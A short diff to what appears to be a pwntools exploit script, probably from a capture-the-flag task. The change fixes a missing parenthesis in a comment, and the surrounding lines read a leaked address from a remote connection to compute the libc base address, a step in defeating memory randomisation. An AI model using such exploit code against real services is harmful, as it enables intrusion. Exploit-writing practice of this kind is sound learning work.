@@ -133,7 +133,7 @@ if __name__ == "__main__":
     d = ''
     while len(d) < 0x10: # read 16 bytes
         d += r.recvn(1)
-    d = d[8:0x10] # discard first 8 bytes (execution time of 'pop rax;pop rdx;push rax;ret'
+    d = d[8:0x10] # discard first 8 bytes (execution time of 'pop rax;pop rdx;push rax;ret')
     l = u64(d)
     LIBC_BASE = l - libc.symbols['write']
     log.info('leak: %#x' % l)
